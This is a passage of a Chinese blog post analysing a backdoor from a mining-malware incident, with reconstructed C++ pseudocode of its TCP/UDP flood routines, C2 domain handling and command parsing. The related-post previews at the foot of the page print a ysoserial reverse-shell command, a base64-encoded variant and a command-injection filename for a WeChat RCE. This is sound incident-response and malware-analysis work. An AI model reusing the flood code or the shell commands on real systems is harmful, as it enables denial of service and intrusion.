class="keyword">this</span>-&gt;recv_buffer);</span><br><span class="line">        recv_ptr = std::vector&lt;<span class="type">char</span>&gt;::<span class="keyword">operator</span>[](&amp;<span class="keyword">this</span>-&gt;recv_buffer, <span class="number">0</span>);</span><br><span class="line">        CNetBase::<span class="built_in">Recv</span>(&amp;buffer, <span class="keyword">this</span>-&gt;socket_fd, recv_ptr, recv_size, <span class="number">5000</span>, &amp;result);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 关闭连接</span></span><br><span class="line">    CNetBase::<span class="built_in">Close</span>(<span class="keyword">this</span>-&gt;socket_fd, &amp;result);</span><br><span class="line">    <span class="keyword">this</span>-&gt;socket_fd = <span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 等待1秒后继续</span></span><br><span class="line">    CThreadCondition::<span class="built_in">Wait</span>(&amp;<span class="keyword">this</span>-&gt;condition, <span class="number">1000</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>攻击原理：<br>	连接建立：与目标服务器建立TCP连接<br>	数据发送：发送预构造的攻击数据包<br>	响应接收：接收服务器响应（可选）<br>	连接关闭：断开连接<br>	循环攻击：短暂等待后继续下一轮攻击<br><code>UDP洪水攻击</code><br><code>CAttackUdp::MakePacket</code>函数分析：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CAttackUdp::MakePacket</span><span class="params">(CProtocolUtil *util)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取攻击参数</span></span><br><span class="line">    <span class="type">int</span> data_length = <span class="keyword">this</span>-&gt;data_length;        <span class="comment">// 数据长度</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> dst_port = <span class="keyword">this</span>-&gt;dst_port;   <span class="comment">// 目标端口</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> src_port = <span class="keyword">this</span>-&gt;src_port;   <span class="comment">// 源端口</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> dst_ip = <span class="keyword">this</span>-&gt;dst_ip;         <span class="comment">// 目标IP</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> src_ip = <span class="keyword">this</span>-&gt;src_ip;         <span class="comment">// 源IP</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 构造UDP包头</span></span><br><span class="line">    <span class="type">int</span> header_size = CPacketAttack::<span class="built_in">BuildUdpHeader</span>(</span><br><span class="line">        &amp;<span class="keyword">this</span>-&gt;packet_buffer[<span class="number">14</span>],  <span class="comment">// 跳过以太网头</span></span><br><span class="line">        (<span class="type">char</span>*)&amp;src_ip,            <span class="comment">// 源IP</span></span><br><span class="line">        dst_ip,                    <span class="comment">// 目标IP</span></span><br><span class="line">        src_port,                  <span class="comment">// 源端口</span></span><br><span class="line">        dst_port,                  <span class="comment">// 目标端口</span></span><br><span class="line">        data_length,               <span class="comment">// 数据长度</span></span><br><span class="line">        util,                      <span class="comment">// 协议工具</span></span><br><span class="line">        &amp;result</span><br><span class="line">    );</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置包长度</span></span><br><span class="line">    <span class="keyword">this</span>-&gt;packet_size = header_size;</span><br><span class="line">    <span class="keyword">this</span>-&gt;data_size = data_length;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>UDP攻击特点：<br>	无连接：不需要建立连接，直接发送<br>	高速：每秒可以发送数万个包<br>	伪造源IP：可以伪造源地址<br>	放大效应：通过DNS等协议实现放大</p>
<h2 id="C2通信分析"><a href="#C2通信分析" class="headerlink" title="C2通信分析"></a>C2通信分析</h2><p>域名列表存储位置：g_strConnTgts全局字符串变量中，用逗号分隔</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从main函数中找到的域名解析逻辑</span></span><br><span class="line">CManager::<span class="built_in">GetNodeDomains</span>(<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// GetNodeDomains函数实现</span></span><br><span class="line"><span class="keyword">if</span> (!g_strConnTgts.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">    CUtility::<span class="built_in">Split</span>(g_strConnTgts, <span class="string">&#x27;,&#x27;</span>, <span class="keyword">this</span>-&gt;domain_vector);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>DNS解析过程<br><code>ZX模式（服务器模式）：</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对每个域名进行DNS解析</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; domain_vector.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    string domain = domain_vector[i];</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 使用内置DNS缓存进行解析</span></span><br><span class="line">    CDNSCache::<span class="built_in">GetIpFromDomain</span>(&amp;result, g_dnsCache, domain.<span class="built_in">c_str</span>());</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 将域名解析为IP地址</span></span><br><span class="line">    string ip = <span class="built_in">inet_ntoa</span>(result);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 检查客户端IP是否匹配</span></span><br><span class="line">    <span class="keyword">if</span> (client_ip == <span class="built_in">inet_addr</span>(ip.<span class="built_in">c_str</span>())) &#123;</span><br><span class="line">        <span class="comment">// 允许连接</span></span><br><span class="line">        accept_connection = <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>FX模式（客户端模式）：</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 直接使用域名建立连接</span></span><br><span class="line"><span class="keyword">for</span> (string domain : domain_vector) &#123;</span><br><span class="line">    CThreadFXConnection *conn = <span class="keyword">new</span> <span class="built_in">CThreadFXConnection</span>(<span class="keyword">this</span>, domain.<span class="built_in">c_str</span>());</span><br><span class="line">    conn-&gt;<span class="built_in">StartThread</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>通信加密与安全机制</strong><br><code>发送数据序列化：</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CCommunicate::MakeSend</span><span class="params">(vector&lt;<span class="type">char</span>&gt;&amp; buffer, <span class="type">int</span> msg_type, CSerial* data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1. 获取数据大小</span></span><br><span class="line">    <span class="type">int</span> data_size = data-&gt;<span class="built_in">GetSize</span>();</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 调整buffer大小 (8字节头部 + 数据)</span></span><br><span class="line">    buffer.<span class="built_in">resize</span>(data_size + <span class="number">8</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. 写入消息类型 (前4字节)</span></span><br><span class="line">    *(<span class="type">int</span>*)buffer[<span class="number">0</span>] = msg_type;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 写入数据长度 (后4字节)</span></span><br><span class="line">    *(<span class="type">int</span>*)buffer[<span class="number">4</span>] = data_size;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5. 序列化数据到buffer (从第8字节开始)</span></span><br><span class="line">    <span class="keyword">if</span> (data_size &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        data-&gt;<span class="built_in">Serialize</span>(&amp;buffer[<span class="number">8</span>], data_size);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> data_size + <span class="number">8</span>;  <span class="comment">// 返回总长度</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>接收数据反序列化：</code></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">CManager::RecvCommand</span><span class="params">(<span class="type">int</span> socket, <span class="type">void</span>* extra_param)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 1. 接收消息类型 (4字节)</span></span><br><span class="line">    <span class="type">int</span> msg_type;</span><br><span class="line">    CNetBase::<span class="built_in">Recv</span>(socket, &amp;msg_type, <span class="number">4</span>, TIMEOUT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 2. 接收数据长度 (4字节)</span></span><br><span class="line">    <span class="type">int</span> data_length;</span><br><span class="line">    CNetBase::<span class="built_in">Recv</span>(socket, &amp;data_length, <span class="number">4</span>, TIMEOUT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 3. 接收数据内容</span></span><br><span class="line">    vector&lt;<span class="type">char</span>&gt; data_buffer;</span><br><span class="line">    data_buffer.<span class="built_in">resize</span>(data_length);</span><br><span class="line">    CNetBase::<span class="built_in">Recv</span>(socket, &amp;data_buffer[<span class="number">0</span>], data_length, TIMEOUT);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 4. 创建命令消息对象</span></span><br><span class="line">    CCmdMsg* cmd = <span class="keyword">new</span> <span class="built_in">CCmdMsg</span>(msg_type, data_buffer);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 5. 根据消息类型处理</span></span><br><span class="line">    <span class="keyword">switch</span> (msg_type) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="keyword">case</span> <span class="number">2</span>: <span class="keyword">case</span> <span class="number">5</span>: <span class="keyword">case</span> <span class="number">7</span>: <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">            <span class="comment">// 发送到命令队列</span></span><br><span class="line">            cmd_queue-&gt;<span class="built_in">MessageSend</span>(cmd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>: <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">            <span class="comment">// 设置额外参数后发送</span></span><br><span class="line">            cmd-&gt;<span class="built_in">SetExtra</span>(extra_param);</span><br><span class="line">            cmd_queue-&gt;<span class="built_in">MessageSend</span>(cmd);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="comment">// 删除无效命令</span></span><br><span class="line">            <span class="keyword">delete</span> cmd;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>连接安全验证采用白名单</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">validate_client_ip</span><span class="params">(sockaddr_in client_addr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">uint32_t</span> client_ip = client_addr.sin_addr.s_addr;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 遍历允许的域名列表</span></span><br><span class="line">    <span class="keyword">for</span> (string domain : allowed_domains) &#123;</span><br><span class="line">        <span class="comment">// DNS解析域名</span></span><br><span class="line">        string resolved_ip = <span class="built_in">dns_resolve</span>(domain);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 比较IP地址</span></span><br><span class="line">        <span class="keyword">if</span> (client_ip == <span class="built_in">inet_addr</span>(resolved_ip.<span class="built_in">c_str</span>())) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;  <span class="comment">// 允许连接</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;  <span class="comment">// 拒绝连接</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://lan1oc.github.io">lan1oc</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://lan1oc.github.io/2025/12/30/%E5%B7%A5%E4%BD%9C/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/">https://lan1oc.github.io/2025/12/30/%E5%B7%A5%E4%BD%9C/%E9%80%86%E5%90%91%E5%88%86%E6%9E%90/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E4%BA%8B%E4%BB%B6%E7%9A%84%E5%90%8E%E9%97%A8%E5%88%86%E6%9E%90/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://lan1oc.github.io" target="_blank">lan1ocのblog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%B9%B2%E4%B8%AD%E5%AD%A6/">干中学</a></div><div class="post-share"><div class="social-share" data-image="/img/c1/3.webp" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/12/29/%E8%AE%B0%E5%BD%95/%E7%AC%94%E8%AE%B0/%E7%AC%94%E8%AE%B010%E2%80%94%E2%80%94ida_pro%20mcp%E7%9A%84%E5%AE%89%E8%A3%85/" title="笔记10——ida_pro mcp的安装"><img class="cover" src="/img/c1/2.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">笔记10——ida_pro mcp的安装</div></div><div class="info-2"><div class="info-item-1">安装1pip install https://github.com/mrexodia/ida-pro-mcp/archive/refs/heads/main.zip  1ida-pro-mcp --install 安装完然后电脑重启下，重启很关键，非常之关键trae有点问题，不知道为什么还是要我手动配置一下，明明文件存在 </div></div></div></a><a class="pagination-related" href="/2026/01/13/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95or%E6%8C%96%E6%B4%9E%E6%B5%8B%E8%AF%95/shiro%E6%9C%89key%E6%97%A0%E9%93%BE%EF%BC%88%E4%B8%8A%EF%BC%89/" title="[记录]尝试shiro有key无链利用，但失败"><img class="cover" src="/img/cover/1.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">[记录]尝试shiro有key无链利用，但失败</div></div><div class="info-2"><div class="info-item-1">验证一把梭没梭出来，默认key，但是无链然后用shiro_tool测试有没有别的利用方式然后用urldns验证了下，有出网请求 利用失败(JRMPClient)踩坑尝试反弹shell 1java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 &quot;bash -i &gt;&amp; /dev/tcp/x.x.x.x/404 0&gt;&amp;1&quot; 没弹回来base64编码一下命令 1java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 6789 CommonsCollections5 &quot;bash -c &#123;echo,xxx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; 还是没弹啊，换利用链试试，没想到别的方法，就一个个手打测试，终于有了 1java -cp ysoserial-all.jar...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/08/21/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B8%97%E9%80%8F/%E5%88%9D%E5%AD%A6/" title="初步接触微信小程序"><img class="cover" src="/img/cover/1.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-21</div><div class="info-item-2">初步接触微信小程序</div></div><div class="info-2"><div class="info-item-1">小程序位置新版微信不太一样，直接everything搜Applet 1%appdata%\Tencent\xwechat\radium\Applet\packages 然后运行一个小程序，这里就会有文件夹产生，如果运行一个就产生多个文件夹就找有__APP__.wxapkg的文件夹要反编译的就是__APP__.wxapkg 测试（用fine，反编译拿敏感信息）启动被测小程序，然后就会有文件夹生成直接用fine工具，配置好路径然后他就会自动进行提取敏感信息 信息泄露拿到appid和secret的利用方式接口调试工具直接获取token然后就是到运维中心操作就行 </div></div></div></a><a class="pagination-related" href="/2025/09/17/%E5%B7%A5%E4%BD%9C/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/1/" title="艰难的应急，但定位到了主机，找到了木马"><img class="cover" src="/img/cover/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-17</div><div class="info-item-2">艰难的应急，但定位到了主机，找到了木马</div></div><div class="info-2"><div class="info-item-1">事件背景最近在网信办驻场，大多数时候蛮闲的，基本就是搞文档，然后企业要复测，天天被骚扰麻了，就写exp给他们让他们自测，但是有安全事件就要出去应急。这不就接到一个通报，说是木马远控事件看通报文件，时间跨度是2025-09-15 12:45:12-2025-09-15...</div></div></div></a><a class="pagination-related" href="/2025/12/20/%E5%B7%A5%E4%BD%9C/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E6%8C%96%E7%9F%BF%E7%97%85%E6%AF%92%E5%BA%94%E6%80%A5%E6%8E%92%E6%9F%A5/" title="实战——挖矿病毒应急排查(docker镜像取证与分析)"><img class="cover" src="/img/cover/2.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-20</div><div class="info-item-2">实战——挖矿病毒应急排查(docker镜像取证与分析)</div></div><div class="info-2"><div class="info-item-1">现场取证定位主机对方有奇安信的设备，直接按照外联ip查到了涉事主机 主机排查，根据威胁情报比对然后查看那个主机进程 1top cpu拉满了，包是挖矿病毒了根据威胁情报显示，只有一个样本，4311文件也找到了该进程接着就是定位文件了 1lsof -c 4311 但是有报错，显示的信息都是docker相关的，然后查看了一下docker容器的资源使用情况 1docker stats 那有问题的就是这个了，停掉该容器之后，cpu占用就下来了，并且也没有4311在运行了，接着就是打包成镜像取证了 导出镜像取证1docker commit dify-web-1 dify-web:20251219 1docker save -o dify-web.tar dify-web:20251219 镜像分析静态分析只读启动镜像先加载镜像 1docker load -i dify-web-backup.tar 然后启动 123456sudo docker run --rm -it \  --read-only \  --network none \  --entrypoint /bin/sh \ ...</div></div></div></a><a class="pagination-related" href="/2025/08/21/%E5%B7%A5%E4%BD%9C/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%94%E8%AE%B0/" title="应急响应笔记"><img class="cover" src="/img/cover/3.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-08-21</div><div class="info-item-2">应急响应笔记</div></div><div class="info-2"><div class="info-item-1">定位主机有安全设备直接根据告警的内网ip一键定位 无安全设备那通报给的ip包是公网统一出口ip，就得一台台电脑排查了 排查思路查看外联，定位pid-&gt;tasklist定位进程名-&gt;找路径-&gt;删除-&gt;持久化排查 查看外联，定位pid1netstat -ano | findstr ip 红框那一列就是pid   tasklist定位进程名1tasklist /FI &quot;PID eq 4992&quot;  找路径任务管理器可以直接打开任务管理器找，在详细信息那里，找到后右键找路径 命令行cmd1wmic process where name=&quot;steam.exe&quot; get ExecutablePath 或者 1dir C:\a.exe /s /b powershell1Get-Process steam | Select-Object...</div></div></div></a><a class="pagination-related" href="/2026/02/10/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95or%E6%8C%96%E6%B4%9E%E6%B5%8B%E8%AF%95/linux%E7%89%88%E5%BE%AE%E4%BF%A11click%20rce/" title="linux版微信1click rce复现，国产系统通杀"><img class="cover" src="/img/cover/2.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-02-10</div><div class="info-item-2">linux版微信1click rce复现，国产系统通杀</div></div><div class="info-2"><div class="info-item-1">复现随便找个pdf文件，然后文件名是反引号包裹的命令，然后点击就送，尝试过麒麟和鸿蒙系统，全通杀 反弹shell命名限制换linux系统用mv命令绕过了 1mv 1.pdf &#x27;`echo &quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvODg4OCAwPiYx&quot; | base64 -d | bash`.pdf&#x27; 这是弹本地的命令 </div></div></div></a><a class="pagination-related" href="/2025/09/30/%E5%B7%A5%E4%BD%9C/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95or%E6%8C%96%E6%B4%9E%E6%B5%8B%E8%AF%95/%E5%AD%98%E5%82%A8%E6%A1%B6%E7%9A%84%E4%B8%80%E4%BA%9B%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF/" title="存储桶的一些测试思路"><img class="cover" src="/img/cover/2.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-30</div><div class="info-item-2">存储桶的一些测试思路</div></div><div class="info-2"><div class="info-item-1">...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/joker.webp" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">lan1oc</div><div class="author-info-description">57qv6I+c54uX572i5LqG</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">106</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">31</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/lan1oc"><i class="fab fa-github"></i><span>没啥用的仓库</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">随便写写</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%96%E6%A0%B7"><span class="toc-number">1.</span> <span class="toc-text">取样</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mcp%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">mcp分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E4%BF%A1%E6%81%AF"><span class="toc-number">2.1.</span> <span class="toc-text">基本信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%81%B6%E6%84%8F%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">恶意行为分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E5%A4%9A%E5%8A%9F%E8%83%BD%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6"><span class="toc-number">2.2.1.</span> <span class="toc-text">1. 多功能恶意软件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%94%AF%E6%8C%81%E7%9A%84%E6%94%BB%E5%87%BB%E7%B1%BB%E5%9E%8B"><span class="toc-number">2.2.2.</span> <span class="toc-text">2. 支持的攻击类型</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%B1%82%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.2.1.</span> <span class="toc-text">网络层攻击:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%B1%82%E6%94%BB%E5%87%BB"><span class="toc-number">2.2.2.2.</span> <span class="toc-text">应用层攻击:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A0%B8%E5%BF%83%E5%8A%9F%E8%83%BD%E5%88%86%E6%9E%90"><span class="toc-number">2.2.3.</span> <span class="toc-text">3. 核心功能分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E7%A8%8B%E5%BA%8F%E6%B5%81%E7%A8%8B"><span class="toc-number">2.2.3.1.</span> <span class="toc-text">主程序流程:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%88%86%E6%9E%90%E6%9C%BA%E5%88%B6"><span class="toc-number">2.2.3.2.</span> <span class="toc-text">反分析机制:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8C%81%E4%B9%85%E5%8C%96%E6%9C%BA%E5%88%B6"><span class="toc-number">2.2.3.3.</span> <span class="toc-text">持久化机制:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%80%9A%E4%BF%A1"><span class="toc-number">2.2.3.4.</span> <span class="toc-text">网络通信:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%85%B3%E9%94%AE%E7%BB%84%E4%BB%B6"><span class="toc-number">2.2.4.</span> <span class="toc-text">4. 关键组件</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%85%8D%E7%BD%AE%E7%AE%A1%E7%90%86"><span class="toc-number">2.2.4.1.</span> <span class="toc-text">配置管理:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86"><span class="toc-number">2.2.4.2.</span> <span class="toc-text">资源管理:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E5%9F%BA%E7%A1%80"><span class="toc-number">2.2.4.3.</span> <span class="toc-text">网络基础:</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%84%9F%E6%9F%93%E6%8C%87%E6%A0%87-IoC"><span class="toc-number">2.2.5.</span> <span 